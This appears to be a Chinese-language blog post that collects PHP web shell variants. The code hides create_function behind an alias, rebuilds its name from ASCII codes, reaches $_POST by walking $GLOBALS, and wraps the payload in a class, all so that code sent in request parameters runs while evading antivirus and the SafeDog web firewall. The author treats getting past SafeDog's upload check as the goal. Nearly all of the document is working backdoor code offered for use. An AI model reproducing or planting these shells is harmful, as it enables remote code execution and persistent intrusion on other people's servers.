函数取别名
<?php 
use function \create_function as a;
$fun = a("",$_POST['x']);
$fun();
?>

利用数组转换需要的函数
<?php 
// create_function
$num = array(99 ,114 ,101 ,97 ,116 ,101 ,95 ,102 ,117 ,110 ,99 ,116 ,105 ,111,110);
$num2 = array();
// chr()转换ascii
for($i = 0;$i<count($num);$i++){
$num2[$i] = chr($num[$i]);
}
$str = '';
// 数组转换字符串
$str = implode($str, $num2);
$str("", $_POST['x'])();
?>

利用全局变量遍历获取想要全局变量(手动滑天下之大稽)（组合拳）
<?php 
// create_function
$num = array(99 ,114 ,101 ,97 ,116 ,101 ,95 ,102 ,117 ,110 ,99 ,116 ,105 ,111,110);
$num2 = array();
// chr()转换ascii
for($i = 0;$i<count($num);$i++){
$num2[$i] = chr($num[$i]);
}
$str = '';
// 数组转换字符串
$str = implode($str, $num2);
// 遍历全局变量
foreach ($GLOBALS as $key => $value) {
if($key == '_POST'){
$fun = @$str("", $$key['x'])();
}
}
?>

利用自定义类加载

默默扣出了一个？，为啥安全狗的文件上传这么好过。

<?php 
class Shell{
public function payload()
{
return $_POST['x'];
}
}
$S = new Shell();
@create_function("", ($S->payload()))();
?>

接收变量

这个报毒喔，尝试怎么绕过这个鬼东西。

<?php 
$a = $_GET['x'];
$b = $_GET['a'];
$a($b);
?>

尝试绕过后的代码，eval，assert这两个函数是我太菜了，我调试不出来。统一用create_function做演示。

<?php 
// 接收的还是create_function
$g = '';
$p = '';
foreach ($GLOBALS as $key => $value) {
if($key == '_GET'){
$g = $$key['g'];
}elseif($key == '_POST'){
$p = $$key['x'];
}
}
$a = $g;
$a("",$p)();
?>
